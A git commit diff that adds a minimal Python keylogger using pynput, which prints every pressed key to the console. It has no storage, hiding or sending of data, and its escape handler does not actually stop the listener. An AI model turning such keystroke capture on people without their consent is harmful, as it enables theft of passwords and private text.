d174716ac8ffdf28bc7fa9c5a75b2042ff178315
Mayank Agrawal <mayankagrawal0017@gmail.com>
2020-09-10 23:45:00 +0530

    add code for basic key_logger

--- key_log_basic.py
+++ key_log_basic.py
@@ -1,3 +1,12 @@
 from pynput import keyboard
 from pynput import mouse
 from pynput.keyboard import Listener, Key
+def on_press(key):
+    print(f"{key} pressed")
+
+def on_release(key):
+    if key == Key.esc:
+         return
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+         listener.join()
